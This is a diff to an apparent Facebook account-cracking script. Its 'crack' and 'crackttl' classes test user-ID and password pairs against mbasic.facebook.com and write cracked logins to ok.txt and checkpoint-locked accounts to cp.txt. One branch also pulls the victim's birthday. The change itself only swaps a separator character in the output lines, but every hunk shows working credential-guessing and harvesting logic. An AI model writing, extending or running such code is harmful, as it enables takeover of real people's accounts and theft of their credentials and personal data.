@@ -438,16 +438,16 @@ class crack:
 				log=mbasic(fl.get("id"),
 					i,"https://mbasic.facebook.com")
 				if log.get("status")=="success":
-					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
-					self.ada.append("%s • %s"%(fl.get("id"),i))
+					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s | %s               "%(fl.get("id"),i)))
+					self.ada.append("%s | %s"%(fl.get("id"),i))
 					open("ok.txt","a+").write(
-						"%s • %s\n"%(fl.get("id"),i))
+						"%s | %s\n"%(fl.get("id"),i))
 					break
 				elif log.get("status")=="cp":
-					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
-					self.cp.append("%s • %s"%(fl.get("id"),i))
+					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s | %s               "%(fl.get("id"),i)))
+					self.cp.append("%s | %s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
-						"%s • %s\n"%(fl.get("id"),i))
+						"%s | %s\n"%(fl.get("id"),i))
 					break
 				else:continue
 					
@@ -527,13 +527,13 @@ class crackttl:
 				log=ttll(fl.get("id"),
 					i,"https://mbasic.facebook.com")
 				if log.get("status")=="success":
-					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
-					self.ada.append("%s • %s"%(fl.get("id"),i))
+					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s | %s               "%(fl.get("id"),i)))
+					self.ada.append("%s | %s"%(fl.get("id"),i))
 					if fl.get("id") in open("ok.txt").read():
 						break
 					else:
 						open("ok.txt","a+").write(
-						"%s • %s\n"%(fl.get("id"),i))
+						"%s | %s\n"%(fl.get("id"),i))
 					break
 				elif log.get("status")=="cp":
 					try:
@@ -541,10 +541,10 @@ class crackttl:
 						tt=json.loads(ke.text)
 						ttl=tt["birthday"]
 					except:pass
-					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s • %s\x1b[0m   "%(fl.get("id"),i,str(ttl))))
-					self.cp.append("%s • %s"%(fl.get("id"),i))
+					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s | %s | %s\x1b[0m   "%(fl.get("id"),i,str(ttl))))
+					self.cp.append("%s | %s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
-						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
+						"%s | %s | %s\n"%(fl.get("id"),i,str(ttl)))
 					break
 				else:continue
 					
